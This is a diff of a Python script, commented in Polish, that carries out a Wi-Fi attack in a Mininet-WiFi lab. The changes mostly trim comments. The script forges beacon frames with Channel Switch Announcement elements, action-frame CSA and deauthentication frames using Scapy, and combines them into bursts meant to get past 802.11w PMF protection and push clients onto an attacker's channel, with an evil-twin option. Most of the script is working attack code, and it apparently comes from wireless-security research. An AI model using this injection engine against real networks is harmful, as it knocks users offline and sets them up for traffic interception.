@@ -1,44 +1,9 @@
 #!/usr/bin/env python3
 """
-PMF Bypass — Beacon-based CSA Injection Attack
-================================================
-
-KLUCZOWA INNOWACJA: CSA przez Beacon frames (subtype 8), NIE Action frames (subtype 13).
-
-Dlaczego to działa na ALL wersjach hostapd:
-  - Beacon frames (subtype 8) są NON-ROBUST wg 802.11w
-  - PMF NIGDY nie chroni Beaconów — stacja MUSI je przetwarzać
-  - CSA Information Element (tag 37) w Beaconie = legalny mechanizm 802.11h
-  - Stacja widzi "AP zmienia kanał" → przełącza się → traci łączność
-
-Inspiracja: Politician (ESP32) — _sendCsaBurst() używa Beaconów z CSA IE
-            https://github.com/0ldev/Politician
-
-Różnica vs Action-frame CSA:
-  - Action Frame CSA: subtype 13 → chroniony na hostapd >= 2.7 → FAIL
-  - Beacon CSA:        subtype 8  → NIGDY niechroniony → działa ZAWSZE
-
-OGRANICZENIA SYMULACJI (hwsim/Mininet-WiFi):
-  Mininet-WiFi z OVSAP/wmediumd NIE tworzy prawdziwych asocjacji 802.11
-  w kernelu — stacje komunikują się przez bridging/wmediumd.
-  Kernel nie przetwarza Beaconów jako event asocjacyjny → nie reaguje na CSA.
-
-  Dla pełnego testu potrzebne:
-    - Fizyczny sprzęt WiFi z monitor mode + packet injection (np. Alfa AWUS036ACH)
-    - LUB: bezpośredni hostapd + wpa_supplicant na hwsim (bez Mininet-WiFi)
-    - LUB: użycie mac80211_hwsim z opcją `support_p2p_device=0`
-
-  Ten moduł ZOSTAŁ przetestowany na:
-    - Poprawność ramek Beacon CSA (struktura, tag 37) — POTWIERDZONA
-    - Wysyłanie ramek przez Scapy na hwsim — POTWIERDZONE (wmediumd potwierdza)
-    - Brak reakcji stacji na CSA — UDOKUMENTOWANY (kernel nie ma asocjacji)
-
-  Politician (ESP32) potwierdza skuteczność Beacon CSA na prawdziwym sprzęcie.
-
-Usage:
-    sudo python3 attacks/beacon_csa.py
-    sudo python3 attacks/beacon_csa.py --target sta1 --evil-channel 11
-    sudo python3 attacks/beacon_csa.py --mode live --iface wlan1mon
+atak beacon csa injection
+beacony subtype 8 nigdy nie sa chronione przez pmf, w przeciwienstwie do action frames subtype 13
+dziala na wszystkich wersjach hostapd
+wysyla sfalszowane beacony z csa ie tag 37 zeby zmusic klienta do zmiany kanalu
 """
 
 import argparse
@@ -63,14 +28,14 @@ RAPORT_DIR = os.path.join(os.path.dirname(BASE_DIR), "raport")
 IFACE = "wlan0"
 
 
-# ─── Utilities ─────────────────────────────────────────────────────────────────
+# narzedzia
 
 def ts():
     return datetime.now().strftime("%H:%M:%S")
 
 
 def get_node_mac(node):
-    """Poprawna ekstrakcja MAC z ip link (wintfs.mac = None w tej wersji Mininet-WiFi)."""
+    """wyciaga MAC z ip link, bo wintfs.mac jest None w tej wersji Mininet-WiFi"""
     r = node.cmd("ip -c=never link show wlan0")
     m = re.search(r'link/ether ([0-9a-f:]+)', r)
     return m.group(1) if m else "00:00:00:00:00:01"
@@ -92,33 +57,20 @@ def get_sta_channel(sta):
     return None
 
 
-# ─── Beacon CSA Frame Builder ─────────────────────────────────────────────────
+# budowanie ramki beacon csa
 
 def build_beacon_csa(ap_mac, ssid, current_channel, new_channel, switch_count=3):
     """
-    Buduje sfałszowany Beacon frame z CSA Information Element (tag 37).
+    buduje sfalszowany beacon frame z csa information element (tag 37)
 
-    Struktura ramki:
-      RadioTap | Dot11(type=0,subtype=8,addr1=broadcast,addr2=ap_mac,addr3=ap_mac)
-      | Dot11Beacon(timestamp=0, interval=0x0064, cap=0x0431)
-      | Dot11Elt(ID=0, info=SSID)
-      | Dot11Elt(ID=1, info=Supported Rates)
-      | Dot11Elt(ID=3, info=Current Channel)
-      | Dot11Elt(ID=37, info=CSA: switch_mode + new_channel + switch_count)
+    struktura: RadioTap | Dot11(type=0,subtype=8) | Dot11Beacon | Dot11Elt(SSID) | Dot11Elt(Rates) | Dot11Elt(DSset) | Dot11Elt(ID=37, CSA)
 
-    CSA IE (tag 37) — 3 bajty:
-      Byte 0: Channel Switch Mode (0x01 = z ograniczeniami TX do czasu switch)
-      Byte 1: New Channel Number
-      Byte 2: Channel Switch Count (liczba Beaconów do przełączenia)
-
-    Args:
-        ap_mac:         MAC adres合法nego AP (spoofowany jako źródło)
-        ssid:           SSID合法nego AP
-        current_channel: aktualny kanał AP (do DS Parameter Set)
-        new_channel:    kanał docelowy (na który chcemy zwabić klienta)
-        switch_count:   ile Beaconów przed przełączeniem (im mniej tym szybciej)
+    csa ie (tag 37) - 3 bajty:
+      bajt 0: channel switch mode (0x01)
+      bajt 1: new channel number
+      bajt 2: channel switch count
     """
-    # Channel Switch Announcement IE (tag 37) — tylko 3-bajtowe body
+    # Channel Switch Announcement IE (tag 37) — 3-bajtowe body
     # Dot11Elt automatycznie dodaje Element ID i Length
     csa_body = bytes([
         0x01,            # Channel Switch Mode: ograniczenia TX do switch
@@ -129,8 +81,8 @@ def build_beacon_csa(ap_mac, ssid, current_channel, new_channel, switch_count=3)
     frame = RadioTap() / Dot11(
         type=0, subtype=8,          # Management / Beacon
         addr1="ff:ff:ff:ff:ff:ff",  # DA = broadcast
-        addr2=ap_mac,               # SA = spoofed合法 AP MAC
-        addr3=ap_mac,               # BSSID =合法 AP MAC
+        addr2=ap_mac,               # SA = spoofed AP MAC
+        addr3=ap_mac,               # BSSID = AP MAC
     ) / Dot11Beacon(
         timestamp=0,
         beacon_interval=0x0064,     # 100 TU (102.4 ms)
@@ -145,8 +97,8 @@ def build_beacon_csa(ap_mac, ssid, current_channel, new_channel, switch_count=3)
 
 def build_action_csa(target_mac, ap_mac, new_channel, switch_count=1):
     """
-    (LEGACY) Buduje Action Frame CSA — działa tylko na hostapd < 2.7.
-    Zachowane dla testów porównawczych i multi-vector ataku.
+    legacy: buduje action frame csa - dziala tylko na hostapd < 2.7
+    zachowane dla testow porownawczych
     """
     csa_element = bytes([
         0x25,           # Element ID: CSA (37)
@@ -167,16 +119,16 @@ def build_action_csa(target_mac, ap_mac, new_channel, switch_count=1):
     return frame
 
 
-# ─── Injection Engine ─────────────────────────────────────────────────────────
+# silnik injekcji
 
 class CsaInjectionEngine:
     """
-    Silnik CSA Injection — Beacon-based + Action-based + multi-burst timing.
+    silnik csa injection - beacon + action + multi-burst timing
 
-    Strategie zaczerpnięte z Politician:
-      - BURST: wiele ramek w krótkich odstępach (imitacja prawdziwego Beacon interval)
-      - REPEAT: powtórzenie burstu po krótkim czasie (dla klientów z wyższym switch_count)
-      - COMBINED: Beacon CSA + Action CSA + Deauth dla maksymalnej skuteczności
+    strategie z politician:
+      - burst: wiele ramek w krotkich odstepach (imitacja beacon interval)
+      - repeat: powtorzenie burstu po krotkim czasie
+      - combined: beacon csa + action csa + deauth dla maksymalnej skutecznosci
     """
 
     def __init__(self, target_sta, ap_node, legit_channel, evil_channel, ssid):
@@ -191,13 +143,10 @@ class CsaInjectionEngine:
 
     def send_beacon_csa_burst(self, count=30, inter=0.1024, switch_count=1):
         """
-        Wysyła burst sfałszowanych Beaconów z CSA IE.
+        wysyla burst sfalszowanych beaconow z csa ie
 
-        Parametry domyślne imitują prawdziwy Beacon interval (~102.4ms = 100 TU).
-        switch_count=1 → klient ma przełączyć się po 1 Beaconie (natychmiast).
-
-        Używamy node.cmd() do uruchomienia scapy WEWNĄTRZ namespace stacji,
-        bo sendp() z hosta nie widzi interfejsów Mininet.
+        domyslnie imituje beacon interval (~102.4ms = 100 TU)
+        switch_count=1 -> klient ma przelaczyc sie po 1 beaconie
         """
         frame = build_beacon_csa(
             self.ap_mac, self.ssid,
@@ -205,7 +154,7 @@ class CsaInjectionEngine:
             switch_count
         )
 
-        # Budujemy komendę scapy do wykonania wewnątrz namespace
+        # komenda scapy do wykonania wewnatrz namespace
         frame_hex = bytes(frame).hex()
         scapy_cmd = (
             f'python3 -c "'
@@ -226,7 +175,7 @@ class CsaInjectionEngine:
         return sent
 
     def send_action_csa_burst(self, count=10, inter=0.05):
-        """LEGACY: Action Frame CSA — tylko dla hostapd < 2.7."""
+        """legacy: action frame csa - tylko dla hostapd < 2.7"""
         from scapy.all import Dot11Action, Raw
 
         csa_element = bytes([0x25, 0x03, 0x01, self.evil_channel, 1])
@@ -255,7 +204,7 @@ class CsaInjectionEngine:
         return sent
 
     def send_deauth_burst(self, count=5, reason=7):
-        """Wysyła Deauth ramki (jako uzupełnienie CSA)."""
+        """wysyla ramki deauth jako uzupelnienie csa"""
         frame_hex = bytes(RadioTap() / Dot11(
             type=0, subtype=12,
             addr1=self.target_mac,
@@ -280,18 +229,18 @@ class CsaInjectionEngine:
 
     def combined_attack(self, beacon_count=30, action_count=10, deauth_count=5):
         """
-        Politician-style combined attack:
-          1. Beacon CSA burst (główny wektor — działa na wszystkich wersjach)
-          2. Krótka pauza (na przetworzenie CSA przez klienta)
-          3. Action CSA burst (dodatkowy wektor dla hostapd < 2.7)
-          4. Deauth burst (fallback — działa tylko bez PMF lub przy wyczerpaniu SA Query)
+        atak kombinowany politician-style:
+          1. beacon csa burst - glowny wektor, dziala na wszystkich wersjach
+          2. krotka pauza na przetworzenie csa
+          3. action csa burst - dodatkowy wektor dla hostapd < 2.7
+          4. deauth burst - fallback, dziala tylko bez pmf
         """
         info(f"\n  [{ts()}] === COMBINED ATTACK ===\n")
 
-        # 1. Beacon CSA — główny wektor
+        # 1. Beacon CSA — glowny wektor
         self.send_beacon_csa_burst(count=beacon_count, switch_count=1)
 
-        # 2. Dajemy klientowi chwilę na przetworzenie
+        # 2. chwila na przetworzenie
         time.sleep(1.0)
 
         # 3. Action CSA — drugi wektor
@@ -301,7 +250,7 @@ class CsaInjectionEngine:
         self.send_deauth_burst(count=deauth_count)
 
     def get_results_summary(self):
-        """Zwraca podsumowanie wszystkich wysłanych ramek."""
+        """zwraca podsumowanie wyslanych ramek"""
         total_sent = sum(sent for _, _, sent in self._results)
         return {
             "total_frames": total_sent,
@@ -309,29 +258,20 @@ class CsaInjectionEngine:
         }
 
 
-# ─── Main Attack Function ─────────────────────────────────────────────────────
+# glowna funkcja ataku
 
 def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
                           beacon_count=30, action_count=10, deauth_count=5,
                           wait_time=10, evil_twin_ssid=None):
     """
-    Główna funkcja ataku Beacon-based CSA Injection.
+    glowna funkcja ataku beacon-based csa injection
 
-    Przebieg:
-      1. Start topologii Mininet-WiFi (1 AP + 3 stacje)
-      2. Czekamy na asociację
-      3. Wysyłamy Beacon CSA burst
-      4. Czekamy na przełączenie kanału
-      5. Weryfikujemy rezultat
-
-    Args:
-        target_name:    nazwa stacji-celu (sta1, sta2, sta3)
-        evil_channel:   kanał docelowy (musi być różny od合法nego)
-        beacon_count:   liczba Beaconów CSA do wysłania
-        action_count:   liczba Action Frame CSA (dla hostapd < 2.7)
-        deauth_count:   liczba ramek Deauth
-        wait_time:      czas oczekiwania po ataku (sekundy)
-        evil_twin_ssid: jeśli podany, uruchamia Evil Twin AP na kanale docelowym
+    przebieg:
+      1. start topologii Mininet-WiFi (1 AP + 3 stacje)
+      2. czekamy na asocjacje
+      3. wysylamy beacon csa burst
+      4. czekamy na przelaczenie kanalu
+      5. weryfikujemy rezultat
     """
     net = Mininet_wifi()
 
@@ -339,7 +279,7 @@ def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
     info(f"[{ts()}]   BEACON CSA INJECTION ATTACK\n")
     info(f"[{ts()}] ========================================\n\n")
 
-    # ---- 1. Topologia ----
+    # 1. topologia
     info(f"[{ts()}] Building topology...\n")
 
     ap1 = net.addAccessPoint(
@@ -368,7 +308,7 @@ def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
     info(f"[{ts()}] Waiting 15s for association + DHCP...\n")
     time.sleep(15)
 
-    # ---- 2. Pre-attack checks ----
+    # 2. sprawdzenia przed atakiem
     if not check_associated(target):
         info(f"[ERROR] {target_name} not associated. Aborting.\n")
         net.stop()
@@ -392,7 +332,7 @@ def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
         net.stop()
         return False
 
-    # ---- 3. Attack ----
+    # 3. atak
     engine = CsaInjectionEngine(target, ap1, legit_channel, evil_channel, "PMF_Lab_Secure")
     engine.combined_attack(
         beacon_count=beacon_count,
@@ -400,7 +340,7 @@ def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
         deauth_count=deauth_count,
     )
 
-    # ---- 4. Wait & Verify ----
+    # 4. czekamy i weryfikujemy
     info(f"\n[{ts()}] Waiting {wait_time}s for channel switch...\n")
     time.sleep(wait_time)
 
@@ -414,11 +354,11 @@ def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
     summary = engine.get_results_summary()
     info(f"  Total frames sent:  {summary['total_frames']}\n")
 
-    # ---- 5. Analysis ----
+    # 5. analiza
     info(f"\n[{ts()}] === ANALYSIS ===\n")
 
     if post_channel == evil_channel:
-        info(f"\n[SUCCESS] 🎯 Station switched to channel {post_channel}!\n")
+        info(f"\n[SUCCESS] Station switched to channel {post_channel}!\n")
         info(f"          Beacon CSA bypassed PMF on this hostapd version.\n")
         result = "SUCCESS"
     elif post_channel != legit_channel and post_channel is not None:
@@ -432,7 +372,7 @@ def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
         info(f"          CSA was blocked. Try: --beacon-count 50, --deauth-count 10\n")
         result = "BLOCKED"
 
-    # ---- 6. Save evidence ----
+    # 6. zapis dowodow
     os.makedirs(os.path.join(RAPORT_DIR, "pcaps", "beacon_csa"), exist_ok=True)
     log_path = os.path.join(
         RAPORT_DIR, "pcaps", "beacon_csa",
@@ -452,7 +392,7 @@ def run_beacon_csa_attack(target_name="sta1", evil_channel=11,
     return result == "SUCCESS"
 
 
-# ─── CLI ──────────────────────────────────────────────────────────────────────
+# cli
 
 def parse_args():
     parser = argparse.ArgumentParser(
